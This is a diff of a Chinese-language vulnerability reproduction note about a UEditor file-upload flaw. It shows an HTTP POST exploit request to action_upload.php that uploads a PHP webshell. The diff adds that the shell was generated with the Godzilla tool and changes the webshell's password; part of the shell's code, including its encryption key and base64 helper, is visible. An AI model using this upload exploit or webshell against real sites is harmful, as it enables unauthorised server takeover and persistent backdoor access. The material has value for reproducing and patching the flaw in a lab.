@@ -17,7 +17,7 @@
 # 0x05 漏洞复现
 攻击环境：kali x64
 
-攻击payload如下，替换其中的php代码部分为你的webshell即可：
+攻击payload如下，替换其中的php代码部分为你的webshell即可，我这里用的是哥斯拉生成的php webshell：
 ```
 POST /module/ueditor/php/action_upload.php?action=uploadfile HTTP/1.1
 Host: 127.0.0.1
@@ -67,7 +67,7 @@ Content-Type: text/plain
     function O($D){
         return base64_decode($D);
     }
-    $P='PASS_1z';
+    $P='Pass_v1';
     $V='payload';
     $T='3c6e0b8a9c15224a';
     if (isset($_POST[$P])){
